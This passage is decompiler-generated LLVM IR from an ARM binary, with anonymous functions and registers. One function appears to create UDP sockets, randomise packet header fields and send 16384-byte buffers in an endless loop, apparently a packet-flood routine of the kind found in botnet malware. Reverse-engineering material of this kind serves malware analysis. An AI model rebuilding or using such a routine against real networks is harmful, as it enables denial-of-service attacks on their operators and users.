  %v4_cdc0 = sdiv i32 %v0_cdb8, 256
  store i32 %v4_cdc0, i32* %r3.global-to-local, align 4
  %v1_cdc4 = load i32, i32* @r4, align 4
  %v9_cdc4 = icmp eq i32 %v3_c920, %v1_cdc4
  store i1 %v9_cdc4, i1* %cpsr_z.global-to-local, align 1
  %v3_cdc8 = load i32, i32* @r5, align 4
  %v4_cdc8 = add i32 %v3_cdc8, 20
  %v5_cdc8 = inttoptr i32 %v4_cdc8 to i8*
  store i8 %v1_cdb8, i8* %v5_cdc8, align 1
  %v0_cdcc = load i32, i32* %r3.global-to-local, align 4
  %v1_cdcc = trunc i32 %v0_cdcc to i8
  %v2_cdcc = load i32, i32* @r6, align 4
  %v3_cdcc = add i32 %v2_cdcc, 1
  %v4_cdcc = inttoptr i32 %v3_cdcc to i8*
  store i8 %v1_cdcc, i8* %v4_cdcc, align 1
  %v0_cdd0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cdd0, label %dec_label_pc_cdd4, label %dec_label_pc_cdb8.dec_label_pc_cc48_crit_edge

dec_label_pc_cdb8.dec_label_pc_cc48_crit_edge:    ; preds = %dec_label_pc_cdb8
  %v1_cc4c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc48

dec_label_pc_cdd4:                                ; preds = %dec_label_pc_cdb8, %dec_label_pc_cc3c
  %v0_cdd4 = call i32 @function_fe24()
  %v1_cdd4 = trunc i32 %v0_cdd4 to i8
  %v4_cdd8 = sdiv i32 %v0_cdd4, 256
  store i32 %v4_cdd8, i32* %r3.global-to-local, align 4
  %v3_cddc = load i32, i32* @r6, align 4
  %v4_cddc = add i32 %v3_cddc, 2
  %v5_cddc = inttoptr i32 %v4_cddc to i8*
  store i8 %v1_cdd4, i8* %v5_cddc, align 1
  store i32 %v5_c7ec, i32* %r0.global-to-local, align 4
  %v1_cde4 = load i32, i32* @r4, align 4
  %v9_cde4 = icmp eq i32 %v5_c7ec, %v1_cde4
  store i1 %v9_cde4, i1* %cpsr_z.global-to-local, align 1
  %v0_cde8 = load i32, i32* %r3.global-to-local, align 4
  %v1_cde8 = trunc i32 %v0_cde8 to i8
  %v2_cde8 = load i32, i32* @r6, align 4
  %v3_cde8 = add i32 %v2_cde8, 3
  %v4_cde8 = inttoptr i32 %v3_cde8 to i8*
  store i8 %v1_cde8, i8* %v4_cde8, align 1
  %v0_cdec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cdec, label %dec_label_pc_cdf0, label %dec_label_pc_cdd4.dec_label_pc_cc54_crit_edge

dec_label_pc_cdd4.dec_label_pc_cc54_crit_edge:    ; preds = %dec_label_pc_cdd4
  %v1_cc58.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc54

dec_label_pc_cdf0:                                ; preds = %dec_label_pc_cdd4, %dec_label_pc_cc48
  %v0_cdf0 = call i32 @function_fe24()
  store i32 %v0_cdf0, i32* %r0.global-to-local, align 4
  store i32 %v6_c804, i32* %r2.global-to-local, align 4
  %v1_cdf8 = load i32, i32* @r4, align 4
  %v9_cdf8 = icmp eq i32 %v6_c804, %v1_cdf8
  store i1 %v9_cdf8, i1* %cpsr_z.global-to-local, align 1
  %v1_cdfc = load i32, i32* @r6, align 4
  %v2_cdfc = add i32 %v1_cdfc, 4
  %v3_cdfc = inttoptr i32 %v2_cdfc to i32*
  store i32 %v0_cdf0, i32* %v3_cdfc, align 4
  br i1 %v9_cdf8, label %dec_label_pc_ce04, label %dec_label_pc_cc60

dec_label_pc_ce04:                                ; preds = %dec_label_pc_cdf0, %dec_label_pc_cc54
  %v0_ce04 = call i32 @function_fe24()
  store i32 %v0_ce04, i32* %r0.global-to-local, align 4
  store i32 %v1_c924, i32* %r3.global-to-local, align 4
  store i1 %v2_ce0c, i1* %cpsr_z.global-to-local, align 1
  %v1_ce10 = load i32, i32* @r6, align 4
  %v2_ce10 = add i32 %v1_ce10, 8
  %v3_ce10 = inttoptr i32 %v2_ce10 to i32*
  store i32 %v0_ce04, i32* %v3_ce10, align 4
  br i1 %v2_ce0c, label %dec_label_pc_cc6c, label %dec_label_pc_ce18

dec_label_pc_ce18:                                ; preds = %dec_label_pc_cc60, %dec_label_pc_ce04
  %v0_ce18 = call i32 @function_fe24()
  %v1_ce18 = trunc i32 %v0_ce18 to i8
  store i32 %v0_ce18, i32* %r0.global-to-local, align 4
  %v4_ce1c = sdiv i32 %v0_ce18, 256
  store i32 %v4_ce1c, i32* %r3.global-to-local, align 4
  %v1_ce20 = trunc i32 %v4_ce1c to i8
  %v2_ce20 = load i32, i32* @r6, align 4
  %v3_ce20 = add i32 %v2_ce20, 19
  %v4_ce20 = inttoptr i32 %v3_ce20 to i8*
  store i8 %v1_ce20, i8* %v4_ce20, align 1
  %v3_ce24 = load i32, i32* @r6, align 4
  %v4_ce24 = add i32 %v3_ce24, 18
  %v5_ce24 = inttoptr i32 %v4_ce24 to i8*
  store i8 %v1_ce18, i8* %v5_ce24, align 1
  br label %dec_label_pc_cc6c

dec_label_pc_ce2c:                                ; preds = %dec_label_pc_c8d4
  %v0_ce2c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_ce2c, i32* %r0.global-to-local, align 4
  %v1_ce30 = call i32 @function_12e9c(i32 %v0_ce2c)
  store i32 %v1_ce30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ce34

dec_label_pc_ce34:                                ; preds = %dec_label_pc_c6fc, %dec_label_pc_ce2c
  %v29_ce38 = phi i32 [ %v3_c8c4, %dec_label_pc_c6fc ], [ %v1_ce30, %dec_label_pc_ce2c ]
  store i32 %v3_c6fc, i32* %r4.global-to-local, align 4
  store i32 %v12_c6fc, i32* %r7.global-to-local, align 4
  ret i32 %v29_ce38

; uselistorder directives
  uselistorder i32 %v4_ce1c, { 1, 0 }
  uselistorder i32 %v0_ce18, { 0, 2, 1 }
  uselistorder i32 %v0_cdb8, { 0, 2, 1 }
  uselistorder i32 %v0_cd9c, { 0, 2, 1 }
  uselistorder i32 %v2_cd70, { 1, 0 }
  uselistorder i32 %v8_cd50, { 2, 0, 1, 3 }
  uselistorder i32 %v3_cd3c, { 1, 0 }
  uselistorder i32 %v0_cd2c, { 2, 0, 1, 3 }
  uselistorder i1 %v2_cd0c, { 1, 0 }
  uselistorder i32 %v0_cd00, { 1, 2, 3, 0 }
  uselistorder i32 %v1_ccfc, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_cca4, { 0, 2, 1 }
  uselistorder i32 %v0_cc8c, { 1, 0, 2 }
  uselistorder i1 %v7_cc14, { 2, 1, 0 }
  uselistorder i1 %v2_ce0c, { 2, 3, 1, 0 }
  uselistorder i1 %v9_cd90, { 2, 3, 1, 0 }
  uselistorder i32 %v1_cbc8, { 1, 0, 2, 3 }
  uselistorder i8 %v5_c9e0, { 1, 0 }
  uselistorder i32 %v1_c9c0, { 1, 0 }
  uselistorder i32 %v1_c9b0, { 1, 0 }
  uselistorder i32 %v1_c9ac, { 1, 0 }
  uselistorder i32 %v1_c9a8, { 1, 0 }
  uselistorder i32 %v3_c998, { 1, 0 }
  uselistorder i32 %v1_c988, { 1, 0 }
  uselistorder i32 %v1_c980, { 1, 0 }
  uselistorder i32 %v1_c95c, { 1, 0 }
  uselistorder i32 %v1_c958, { 1, 0 }
  uselistorder i32 %v1_c950, { 1, 0 }
  uselistorder i32 %v1_c924, { 2, 1, 3, 0 }
  uselistorder i32 %v3_c918, { 1, 2, 0, 3 }
  uselistorder i32 %v0_c914, { 3, 0, 1, 2 }
  uselistorder i32 %v0_c910, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_c8f4, { 1, 0 }
  uselistorder i1 %v7_c8c8, { 1, 0 }
  uselistorder i32 %v3_c8c4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_c8b0, { 6, 4, 0, 5, 1, 3, 2 }
  uselistorder i32 %v6_c804, { 3, 2, 1, 0 }
  uselistorder i32 %v5_c7ec, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_c79c, { 1, 0 }
  uselistorder i32 %v5_c734, { 1, 0 }
  uselistorder i32 %v1_c700, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 29, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 31 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 35, 34, 37, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 5, 6, 4, 7, 8, 10, 9, 12, 11, 13, 15, 14, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 39, 27, 28, 29, 30, 34, 31, 32, 33, 35, 37, 36, 38, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32 10240, { 0, 6, 2, 7, 5, 8, 3, 9, 4, 10, 1, 11 }
  uselistorder i32 42, { 2, 0, 3, 1, 4 }
  uselistorder i32 254, { 0, 1, 2, 3, 8, 4, 9, 5, 10, 6, 11, 7, 12 }
  uselistorder label %dec_label_pc_ce34, { 1, 0 }
  uselistorder label %dec_label_pc_ce18, { 1, 0 }
  uselistorder label %dec_label_pc_cc6c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cbe0, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_ce40(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ce40:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-80 = alloca i8, align 1
  %v24_ce40 = load i32, i32* @fp, align 4
  %v1_ce44 = urem i32 %arg1, 256
  store i32 %v1_ce44, i32* @r7, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r6, align 4
  %v1_ce5c = urem i32 %arg3, 256
  store i32 %v1_ce5c, i32* @r4, align 4
  %v2_ce60 = call i32 @function_13a94(i32 %v1_ce44, i32 4)
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %v2_ce60, i32* @sl, align 4
  %v0_ce6c = load i32, i32* @r7, align 4
  %v2_ce70 = call i32 @function_13a94(i32 %v0_ce6c, i32 4)
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* @r5, align 4
  %v0_ce7c = load i32, i32* @r6, align 4
  store i32 %v0_ce7c, i32* %r1.global-to-local, align 4
  store i32 %v2_ce70, i32* @sb, align 4
  %v0_ce8c = load i32, i32* @r4, align 4
  %v4_ce90 = inttoptr i32 %v0_ce7c to i32*
  %v5_ce90 = call i32 @function_a4e8(i32 %v0_ce8c, i32* %v4_ce90, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v3_ce98 = urem i32 %v5_ce90, 65536
  %v0_ce9c = load i32, i32* @r6, align 4
  store i32 %v0_ce9c, i32* %r1.global-to-local, align 4
  %v0_cea4 = load i32, i32* @r5, align 4
  %v0_cea8 = load i32, i32* @r4, align 4
  %v5_ceb0 = inttoptr i32 %v0_ce9c to i32*
  %v6_ceb0 = call i32 @function_a4e8(i32 %v0_cea8, i32* %v5_ceb0, i32 6, i32 %v0_cea4)
  %v0_ceb4 = load i32, i32* @r6, align 4
  store i32 %v0_ceb4, i32* %r1.global-to-local, align 4
  %v3_ceb8 = mul i32 %v6_ceb0, 65536
  store i32 %v3_ceb8, i32* %fp.global-to-local, align 4
  %v0_cec4 = load i32, i32* @r4, align 4
  %v4_cec8 = inttoptr i32 %v0_ceb4 to i32*
  %v5_cec8 = call i32 @function_a4e8(i32 %v0_cec4, i32* %v4_cec8, i32 0, i32 512)
  %v0_ced4 = load i32, i32* @r6, align 4
  store i32 %v0_ced4, i32* %r1.global-to-local, align 4
  %v0_ced8 = load i32, i32* @r4, align 4
  %v3_cee0 = urem i32 %v5_cec8, 65536
  store i32 %v3_cee0, i32* @r6, align 4
  %v4_cee4 = inttoptr i32 %v0_ced4 to i32*
  %v5_cee4 = call i32 @function_a4e8(i32 %v0_ced8, i32* %v4_cee4, i32 1, i32 1)
  %v0_cee8 = load i32, i32* %fp.global-to-local, align 4
  %v3_cee8 = udiv i32 %v0_cee8, 65536
  %v1_cef0 = load i32, i32* @r5, align 4
  %v9_cef0 = icmp eq i32 %v3_cee8, %v1_cef0
  store i32 0, i32* %stack_var_-52, align 4
  br i1 %v9_cef0, label %dec_label_pc_cf18, label %bb

bb:                                               ; preds = %dec_label_pc_ce40
  %v2_cf04 = mul nuw nsw i32 %v3_cee8, 256
  %v4_cf08 = and i32 %v2_cf04, 65280
  %v1_cf0c = urem i32 %v5_cee4, 256
  store i32 %v1_cf0c, i32* @r8, align 4
  %v5_cf10 = udiv i32 %v0_cee8, 16777216
  %v6_cf10 = or i32 %v4_cf08, %v5_cf10
  br label %dec_label_pc_cf24

dec_label_pc_cf18:                                ; preds = %dec_label_pc_ce40
  %v1_cf0c7 = urem i32 %v5_cee4, 256
  store i32 %v1_cf0c7, i32* @r8, align 4
  %v0_cf18 = call i32 @function_fe24()
  %v3_cf20 = urem i32 %v0_cf18, 65536
  br label %dec_label_pc_cf24

dec_label_pc_cf24:                                ; preds = %bb, %dec_label_pc_cf18
  %storemerge17 = phi i32 [ %v6_cf10, %bb ], [ %v3_cf20, %dec_label_pc_cf18 ]
  store i32 %storemerge17, i32* %fp.global-to-local, align 4
  %v0_cf24 = load i32, i32* @r7, align 4
  %tmp41 = icmp slt i32 %v0_cf24, 1
  br i1 %tmp41, label %dec_label_pc_d0cc.preheader, label %dec_label_pc_cf2c

dec_label_pc_d0cc.preheader:                      ; preds = %dec_label_pc_d028, %dec_label_pc_cf24
  %storemerge3.in12.ph = phi i32 [ %v0_cf24, %dec_label_pc_cf24 ], [ %v1_cf80, %dec_label_pc_d028 ]
  %tmp424750 = icmp slt i32 %storemerge3.in12.ph, 1
  br i1 %tmp424750, label %dec_label_pc_d094, label %dec_label_pc_d098.lr.ph

dec_label_pc_cf2c:                                ; preds = %dec_label_pc_cf24
  store i32 %v3_ce98, i32* %r1.global-to-local, align 4
  %v3_cf30 = udiv i32 %v5_ce90, 256
  %v5_cf3c = trunc i32 %v3_cf30 to i8
  store i32 %arg2, i32* @r5, align 4
  %v3_cf54 = udiv i32 %v5_ce90, 65536
  store i32 %v3_cf54, i32* @r4, align 4
  %v4_cf64 = trunc i32 %v3_cf54 to i8
  store i8 %v4_cf64, i8* %stack_var_-80, align 1
  %v9_d074 = icmp eq i32 %v3_ce98, add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1)
  %v2_cf9c = ptrtoint i32* %stack_var_-52 to i32
  %v3_cfcc = bitcast i32* %stack_var_-52 to %sockaddr*
  br label %dec_label_pc_d058

dec_label_pc_cf6c:                                ; preds = %dec_label_pc_d058
  %v2_cf6c = load i8, i8* %stack_var_-80, align 1
  %v3_cf6c = sext i8 %v2_cf6c to i32
  store i32 %v3_cf6c, i32* %r1.global-to-local, align 4
  store i32 %v3_cf30, i32* @r4, align 4
  %v2_cf70 = load i32, i32* @r5, align 4
  %v3_cf70 = add i32 %v2_cf70, 2
  %v4_cf70 = inttoptr i32 %v3_cf70 to i8*
  store i8 %v5_cf3c, i8* %v4_cf70, align 1
  %v0_cf74 = load i32, i32* %r1.global-to-local, align 4
  %v1_cf74 = trunc i32 %v0_cf74 to i8
  %v2_cf74 = load i32, i32* @r5, align 4
  %v3_cf74 = add i32 %v2_cf74, 3
  %v4_cf74 = inttoptr i32 %v3_cf74 to i8*
  store i8 %v1_cf74, i8* %v4_cf74, align 1
  br label %dec_label_pc_cf78

dec_label_pc_cf78:                                ; preds = %dec_label_pc_d080, %dec_label_pc_cf6c
  %v1_cf80 = add i32 %stack_var_-56.0, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_cf90 = call i32 @function_13790(i32 2, i32 2, i32 17)
  store i32 %stack_var_-60.0, i32* @r4, align 4
  %v7_cf98 = icmp eq i32 %v3_cf90, -1
  store i32 %v2_cf9c, i32* %r1.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v2_cfac = load i32, i32* @sb, align 4
  %v3_cfac = add i32 %v2_cfac, %stack_var_-60.0
  %v4_cfac = inttoptr i32 %v3_cfac to i32*
  store i32 %v3_cf90, i32* %v4_cfac, align 4
  br i1 %v7_cf98, label %dec_label_pc_d0d8, label %dec_label_pc_cfb4

dec_label_pc_cfb4:                                ; preds = %dec_label_pc_cf78
  store i32 2, i32* %stack_var_-52, align 4
  %v4_cfcc = call i32 @function_135c0(i32 %v3_cf90, %sockaddr* %v3_cfcc, i32 16)
  %v0_cfd0 = load i32, i32* @r5, align 4
  %v1_cfd0 = add i32 %v0_cfd0, 20
  %v2_cfd0 = inttoptr i32 %v1_cfd0 to i8*
  %v3_cfd0 = load i8, i8* %v2_cfd0, align 1
  %tmp = icmp ugt i8 %v3_cfd0, 31
  br i1 %tmp, label %dec_label_pc_d028, label %dec_label_pc_cfdc

dec_label_pc_cfdc:                                ; preds = %dec_label_pc_cfb4
  %v1_cfdc = add i32 %v0_cfd0, 16
  %v2_cfdc = inttoptr i32 %v1_cfdc to i32*
  %v3_cfdc = load i32, i32* %v2_cfdc, align 4
  store i32 %v3_cfdc, i32* @r4, align 4
  %v0_cfe0 = call i32 @function_fe24()
  %v0_cfe4 = load i32, i32* @r4, align 4
  %v1_cfe8 = and i32 %v0_cfe4, 65280
  %v3_cff0 = mul i32 %v0_cfe4, 16777216
  %v4_cff4 = mul nuw nsw i32 %v1_cfe8, 256
  %v5_cff4 = or i32 %v4_cff4, %v3_cff0
  store i32 %v5_cff4, i32* %r1.global-to-local, align 4
  %v0_cffc = load i32, i32* @r5, align 4
  %v1_cffc = add i32 %v0_cffc, 20
  %v2_cffc = inttoptr i32 %v1_cffc to i8*
  %v3_cffc = load i8, i8* %v2_cffc, align 1
  %v4_cffc = zext i8 %v3_cffc to i32
  %v2_d000 = call i32 @llvm.bswap.i32(i32 %v0_cfe4)
  %v7_d004 = lshr i32 %v0_cfe0, %v4_cffc
  %v8_d004 = add i32 %v7_d004, %v2_d000
  %v3_d010 = mul i32 %v8_d004, 16777216
  %v1_d014 = and i32 %v8_d004, 65280
  %v4_d018 = mul nuw nsw i32 %v1_d014, 256
  %v5_d018 = or i32 %v4_d018, %v3_d010
  store i32 %v5_d018, i32* %r1.global-to-local, align 4
  %v2_d020 = call i32 @llvm.bswap.i32(i32 %v8_d004)
  %v2_d024 = add i32 %v0_cffc, 4
  %v3_d024 = inttoptr i32 %v2_d024 to i32*
  store i32 %v2_d020, i32* %v3_d024, align 4
  %v0_d034.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d028

dec_label_pc_d028:                                ; preds = %dec_label_pc_cfb4, %dec_label_pc_cfdc
  %v0_d034 = phi i32 [ %v0_cfd0, %dec_label_pc_cfb4 ], [ %v0_d034.pre, %dec_label_pc_cfdc ]
  store i32 %stack_var_-60.0, i32* %r1.global-to-local, align 4
  %v1_d030 = load i32, i32* @sb, align 4
  %v2_d030 = add i32 %v1_d030, %stack_var_-60.0
  %v3_d030 = inttoptr i32 %v2_d030 to i32*
  %v4_d030 = load i32, i32* %v3_d030, align 4
  store i32 %v0_d034, i32* %r1.global-to-local, align 4
  %v3_d038 = inttoptr i32 %v0_d034 to %sockaddr*
  %v4_d038 = call i32 @function_135ec(i32 %v4_d030, %sockaddr* %v3_d038, i32 16)
  %v1_d044 = add i32 %stack_var_-60.0, 4
  %v1_d048 = load i32, i32* @r7, align 4
  %v9_d048 = icmp eq i32 %v1_cf80, %v1_d048
  %v0_d050 = load i32, i32* @r5, align 4
  %v1_d050 = add i32 %v0_d050, 24
  store i32 %v1_d050, i32* @r5, align 4
  br i1 %v9_d048, label %dec_label_pc_d0cc.preheader, label %dec_label_pc_d058

dec_label_pc_d058:                                ; preds = %dec_label_pc_d028, %dec_label_pc_cf2c
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_cf2c ], [ %v1_d044, %dec_label_pc_d028 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_cf2c ], [ %v1_cf80, %dec_label_pc_d028 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d064 = call i32 @function_13a94(i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32 1)
  store i32 %v3_ce98, i32* %r1.global-to-local, align 4
  %v2_d078 = load i32, i32* @sl, align 4
  %v3_d078 = add i32 %v2_d078, %stack_var_-60.0
  %v4_d078 = inttoptr i32 %v3_d078 to i32*
  store i32 %v2_d064, i32* %v4_d078, align 4
  br i1 %v9_d074, label %dec_label_pc_d080, label %dec_label_pc_cf6c

dec_label_pc_d080:                                ; preds = %dec_label_pc_d058
  %v0_d080 = call i32 @function_fe24()
  %v1_d080 = trunc i32 %v0_d080 to i8
  %v4_d084 = sdiv i32 %v0_d080, 256
  %v1_d088 = trunc i32 %v4_d084 to i8
  %v2_d088 = load i32, i32* @r5, align 4
  %v3_d088 = add i32 %v2_d088, 3
  %v4_d088 = inttoptr i32 %v3_d088 to i8*
  store i8 %v1_d088, i8* %v4_d088, align 1
  %v3_d08c = load i32, i32* @r5, align 4
  %v4_d08c = add i32 %v3_d08c, 2
  %v5_d08c = inttoptr i32 %v4_d08c to i8*
  store i8 %v1_d080, i8* %v5_d08c, align 1
  br label %dec_label_pc_cf78

dec_label_pc_d094:                                ; preds = %dec_label_pc_d0cc.loopexit, %dec_label_pc_d0cc.preheader, %dec_label_pc_d0d0.loopexit, %dec_label_pc_d094
  br label %dec_label_pc_d094

dec_label_pc_d098:                                ; preds = %dec_label_pc_d098.lr.ph, %dec_label_pc_d0d0.loopexit
  %v0_d098 = load i32, i32* @r8, align 4
  %v2_d098 = icmp eq i32 %v0_d098, 0
  store i32 0, i32* @r5, align 4
  br i1 %v2_d098, label %dec_label_pc_d0a0, label %dec_label_pc_d0e0

dec_label_pc_d0a0:                                ; preds = %dec_label_pc_d098
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_d0a8

dec_label_pc_d0a8:                                ; preds = %dec_label_pc_d0a8, %dec_label_pc_d0a0
  %v0_d0b0 = phi i32 [ %v1_d0b0, %dec_label_pc_d0a8 ], [ 0, %dec_label_pc_d0a0 ]
  %v0_d0a8 = phi i32 [ %v1_d0c4, %dec_label_pc_d0a8 ], [ 0, %dec_label_pc_d0a0 ]
  %v1_d0a8 = load i32, i32* @sb, align 4
  %v2_d0a8 = add i32 %v1_d0a8, %v0_d0a8
  %v3_d0a8 = inttoptr i32 %v2_d0a8 to i32*
  %v4_d0a8 = load i32, i32* %v3_d0a8, align 4
  %v1_d0ac = load i32, i32* @sl, align 4
  %v2_d0ac = add i32 %v1_d0ac, %v0_d0a8
  %v3_d0ac = inttoptr i32 %v2_d0ac to i32*
  %v4_d0ac = load i32, i32* %v3_d0ac, align 4
  store i32 %v4_d0ac, i32* %r1.global-to-local, align 4
  %v1_d0b0 = add i32 %v0_d0b0, 1
  %v0_d0b4 = load i32, i32* @r6, align 4
  %v4_d0bc = inttoptr i32 %v4_d0ac to i32*
  %v5_d0bc = call i32 @function_13700(i32 %v4_d0a8, i32* %v4_d0bc, i32 %v0_d0b4, i32 16384)
  %v1_d0c0 = load i32, i32* @r7, align 4
  %v9_d0c0 = icmp eq i32 %v1_d0b0, %v1_d0c0
  %v0_d0c4 = load i32, i32* @r4, align 4
  %v1_d0c4 = add i32 %v0_d0c4, 4
  store i32 %v1_d0c4, i32* @r4, align 4
  br i1 %v9_d0c0, label %dec_label_pc_d0cc.loopexit, label %dec_label_pc_d0a8

dec_label_pc_d0cc.loopexit:                       ; preds = %dec_label_pc_d0a8
  %tmp4247 = icmp slt i32 %v1_d0b0, 1
  br i1 %tmp4247, label %dec_label_pc_d094, label %dec_label_pc_d098.lr.ph

dec_label_pc_d098.lr.ph:                          ; preds = %dec_label_pc_d0cc.preheader, %dec_label_pc_d0cc.loopexit
  br label %dec_label_pc_d098

dec_label_pc_d0d0.loopexit:                       ; preds = %dec_label_pc_d0e8
  %tmp42 = icmp slt i32 %v0_d110, 1
  br i1 %tmp42, label %dec_label_pc_d094, label %dec_label_pc_d098

dec_label_pc_d0d8:                                ; preds = %dec_label_pc_cf78
  store i32 %v24_ce40, i32* %fp.global-to-local, align 4
  ret i32 %v3_cf90

dec_label_pc_d0e0:                                ; preds = %dec_label_pc_d098
  store i32 0, i32* @fp, align 4
  br label %dec_label_pc_d0e8

dec_label_pc_d0e8:                                ; preds = %dec_label_pc_d0e8, %dec_label_pc_d0e0
  %v0_d0e8 = phi i32 [ %v1_d114, %dec_label_pc_d0e8 ], [ 0, %dec_label_pc_d0e0 ]
  %v1_d0e8 = load i32, i32* @sl, align 4
  %v2_d0e8 = add i32 %v1_d0e8, %v0_d0e8
  %v3_d0e8 = inttoptr i32 %v2_d0e8 to i32*
  %v4_d0e8 = load i32, i32* %v3_d0e8, align 4
  store i32 %v4_d0e8, i32* @r4, align 4
  %v0_d0ec = load i32, i32* @r6, align 4
  store i32 %v0_d0ec, i32* @r1, align 4
  %v1_d0f4 = inttoptr i32 %v4_d0e8 to i8*
  %v2_d0f4 = call i32 @function_10000(i8* %v1_d0f4)
  %v0_d0f8 = load i32, i32* @r5, align 4
  %v1_d0f8 = add i32 %v0_d0f8, 1
  store i32 %v1_d0f8, i32* @r5, align 4
  %v0_d0fc = load i32, i32* @fp, align 4
  %v1_d0fc = load i32, i32* @sb, align 4
  %v2_d0fc = add i32 %v1_d0fc, %v0_d0fc
  %v3_d0fc = inttoptr i32 %v2_d0fc to i32*
  %v4_d0fc = load i32, i32* %v3_d0fc, align 4
  %v0_d100 = load i32, i32* @r4, align 4
  store i32 %v0_d100, i32* %r1.global-to-local, align 4
  %v0_d104 = load i32, i32* @r6, align 4
  %v4_d10c = inttoptr i32 %v0_d100 to i32*
  %v5_d10c = call i32 @function_13700(i32 %v4_d0fc, i32* %v4_d10c, i32 %v0_d104, i32 16384)
  %v0_d110 = load i32, i32* @r5, align 4
  %v1_d110 = load i32, i32* @r7, align 4
  %v9_d110 = icmp eq i32 %v0_d110, %v1_d110
  %v0_d114 = load i32, i32* @fp, align 4
  %v1_d114 = add i32 %v0_d114, 4
  store i32 %v1_d114, i32* @fp, align 4
  br i1 %v9_d110, label %dec_label_pc_d0d0.loopexit, label %dec_label_pc_d0e8

; uselistorder directives
  uselistorder i32 %v1_d114, { 1, 0 }
  uselistorder i32 %v0_d110, { 1, 0 }
  uselistorder i32 %v1_d0c4, { 1, 0 }
  uselistorder i32 %v1_d0b0, { 2, 0, 1 }
  uselistorder i32 %stack_var_-60.0, { 0, 5, 2, 4, 1, 3 }
  uselistorder i32 %v0_d034, { 1, 0 }
  uselistorder i32 %v8_d004, { 1, 2, 0 }
  uselistorder i32 %v0_cfe4, { 1, 0, 2 }
  uselistorder i32 %v3_cf90, { 1, 3, 2, 0 }
  uselistorder i32 %v1_cf80, { 1, 2, 0 }
  uselistorder i32 %v3_cf54, { 1, 0 }
  uselistorder i32 %v3_cf30, { 1, 0 }
  uselistorder i32 %v1_ce44, { 1, 0 }
  uselistorder i8* %stack_var_-80, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 3, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 16, 15, 17, 19, 18, 0 }
  uselistorder label %dec_label_pc_d098.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_d098, { 1, 0 }
  uselistorder label %dec_label_pc_d094, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_d028, { 1, 0 }
  uselistorder label %dec_label_pc_cf24, { 1, 0 }
}

define i32 @function_d124(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d124:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v18_d124 = load i32, i32* @sb, align 4
